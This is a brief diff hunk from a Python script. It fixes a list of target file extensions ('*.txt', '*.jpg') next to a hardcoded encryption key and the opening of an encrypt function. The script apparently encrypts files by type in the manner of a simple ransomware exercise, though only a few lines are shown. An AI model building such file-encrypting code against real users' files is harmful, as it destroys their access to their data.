@@ -3,7 +3,7 @@ import os
 import sys
 
 KEY = b"0123456789123456"
-EXTS = [".txt, .jpg"]
+EXTS = ["*.txt", "*.jpg"]
 
 def encrypt(file_path):
     with open(file_path, "rb") as file: # Abrindo o arquivo a ser criptografado, ler binário (rb)
